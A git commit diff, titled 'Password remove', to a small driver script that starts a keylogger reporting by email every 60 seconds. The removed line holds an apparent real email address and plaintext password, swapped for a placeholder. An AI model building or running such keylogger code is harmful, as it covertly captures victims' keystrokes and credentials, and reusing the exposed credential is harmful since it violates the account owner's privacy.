2f3153129908469886d47aaaf370cb69c5153bb1
Amarjeetkhasyap <31450890+Amarjeetkhasyap@users.noreply.github.com>
2019-11-17 13:10:52 +0530

    Password remove

--- object_of_keylogger.py
+++ object_of_keylogger.py
@@ -1,4 +1,4 @@
 #!/usr/bin/env python
 import keylogger
-my_keylogger = keylogger.Keylogger(60, "amarjeetkhasyap@gmail.com","9540@2479#80$")
+my_keylogger = keylogger.Keylogger(60, "amarjeet@gmail.com","**********")
 my_keylogger.start()
